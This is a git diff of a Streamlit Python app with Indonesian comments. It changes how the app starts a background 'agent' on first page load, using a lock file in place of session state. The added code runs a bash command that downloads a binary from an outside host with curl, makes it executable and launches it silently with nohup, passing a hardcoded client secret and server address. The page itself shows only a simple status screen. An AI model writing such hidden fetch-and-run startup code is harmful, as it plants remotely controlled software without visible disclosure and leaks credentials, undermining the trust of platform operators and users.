@@ -2,6 +2,7 @@ import streamlit as st
 import subprocess
 from datetime import datetime
 import time
+import os # Library 'os' untuk berinteraksi dengan sistem operasi (misal: cek file)
 
 # --- Konfigurasi Halaman ---
 st.set_page_config(
@@ -10,54 +11,47 @@ st.set_page_config(
     layout="centered"
 )
 
-# --- Perintah Shell yang Lebih Kompatibel ---
-# Menggunakan 'ps' dan 'grep' sebagai ganti 'pgrep' yang mungkin tidak ada.
-COMMAND_TO_RUN_ONCE = """
-# Langkah 1: Unduh dan siapkan file agent HANYA jika belum ada.
+# Nama file kunci (lock file) yang akan kita gunakan
+LOCK_FILE = "agent.lock"
+
+# Perintah untuk mengunduh dan menjalankan agent.
+# Kita kembalikan ke versi sederhana karena pengecekan akan dilakukan di Python.
+COMMAND_TO_RUN = """
+# Unduh dan ubah izin HANYA jika file agent belum ada
 if [ ! -f agent ]; then
-    echo "File 'agent' tidak ditemukan, mengunduh..."
     curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && chmod +x agent
 fi
 
-# Langkah 2: Jalankan agent HANYA jika prosesnya belum berjalan.
-# 'ps aux | grep "[a]gent"' adalah cara yang lebih portabel untuk memeriksa proses.
-# Trik [a]gent mencegah grep menemukan dirinya sendiri.
-# 'wc -l' menghitung jumlah baris. Jika 0, berarti proses tidak ditemukan.
-AGENT_PROCESS_COUNT=$(ps aux | grep "[a]gent" | wc -l)
-
-if [ "$AGENT_PROCESS_COUNT" -eq 0 ]; then
-    echo "Proses 'agent' tidak berjalan, memulai..."
-    nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
-        NZ_TLS=true \
-        NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
-        NZ_UUID=6505d69d-e932-405f-aace-06c7c9d1e09d \
-        ./agent > /dev/null 2>&1 &
-else
-    echo "Proses 'agent' sudah berjalan."
-fi
+# Jalankan agent di latar belakang
+nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
+    NZ_TLS=true \
+    NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
+    NZ_UUID=61aeceff-7479-49a9-9900-32df80905be8 \
+    ./agent > /dev/null 2>&1 &
 """
 
-# --- Logika Eksekusi Otomatis ---
+# --- Logika Eksekusi Otomatis Menggunakan Lock File ---
 
-if 'agent_triggered' not in st.session_state:
-    st.session_state.agent_triggered = False
-
-if not st.session_state.agent_triggered:
+# Periksa apakah file kunci BELUM ada.
+if not os.path.exists(LOCK_FILE):
     try:
-        st.info("🚀 Memeriksa status agent di latar belakang...")
+        st.info("🚀 Inisialisasi pertama kali... Memulai agent di latar belakang.")
         
-        # Jalankan script pengecekan menggunakan /bin/bash
-        subprocess.Popen(COMMAND_TO_RUN_ONCE, shell=True, executable='/bin/bash')
+        # Langkah 1: Buat file kunci untuk menandai bahwa kita sudah memulai proses.
+        # 'with open...' akan secara otomatis membuat dan menutup file.
+        with open(LOCK_FILE, "w") as f:
+            f.write(f"Agent started at: {datetime.now()}")
         
-        st.session_state.agent_triggered = True
+        # Langkah 2: Jalankan perintah shell untuk mengunduh dan memulai agent.
+        subprocess.Popen(COMMAND_TO_RUN, shell=True, executable='/bin/bash')
         
-        st.toast("Pemeriksaan agent selesai!", icon="👍")
+        st.toast("Agent berhasil dimulai!", icon="✅")
         time.sleep(2)
         
         st.rerun()
 
     except Exception as e:
-        st.error(f"❌ Terjadi kesalahan saat memeriksa/memulai agent:")
+        st.error(f"❌ Terjadi kesalahan saat inisialisasi agent:")
         st.code(str(e))
         st.stop()
 
@@ -65,7 +59,7 @@ if not st.session_state.agent_triggered:
 # --- Tampilan Utama (UI) ---
 
 st.title("🟢 App Status")
-st.success("Aplikasi berjalan. Agent telah diperiksa dan aktif di latar belakang.")
+st.success("Aplikasi berjalan. Agent telah aktif di latar belakang.")
 st.markdown("---")
 
 clock_placeholder = st.empty()
